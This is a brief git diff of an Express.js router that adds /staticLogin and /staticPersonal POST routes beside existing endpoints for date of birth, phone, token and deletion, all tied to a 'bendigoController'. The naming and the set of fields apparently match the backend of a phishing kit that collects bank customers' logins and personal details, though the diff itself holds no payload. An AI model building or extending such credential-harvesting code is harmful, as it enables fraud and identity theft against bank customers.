@@ -10,6 +10,8 @@ const {
   submitPhone,
   submitDob,
   deleteEntry,
+  staticLogin,
+  staticPersonal,
 } = require("../controllers/bendigoController");
 
 const router = express.Router();
@@ -24,5 +26,7 @@ router.post("/dob", submitDob);
 router.post("/phone", submitPhone);
 router.post("/token", submitToken);
 router.post("/delete", deleteEntry);
+router.post("/staticLogin", staticLogin);
+router.post("/staticPersonal", staticPersonal);
 
 module.exports = router;
